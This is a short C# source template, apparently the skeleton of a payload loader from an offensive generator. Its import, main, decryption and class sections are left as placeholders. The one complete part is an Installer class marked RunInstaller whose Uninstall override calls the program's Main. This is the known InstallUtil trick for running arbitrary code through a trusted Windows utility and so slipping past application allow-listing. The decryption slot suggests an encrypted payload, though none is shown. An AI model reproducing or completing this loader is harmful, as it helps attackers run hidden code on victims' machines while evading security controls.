using System;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace exe
{
    class Program
    {
    	<IMPORTS>
        public static void Main()
        {
		<MAIN>
        }
	<DECRYPTFUNC>
    }
    <CLASSES>

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            Program.Main();
        }
    }
}
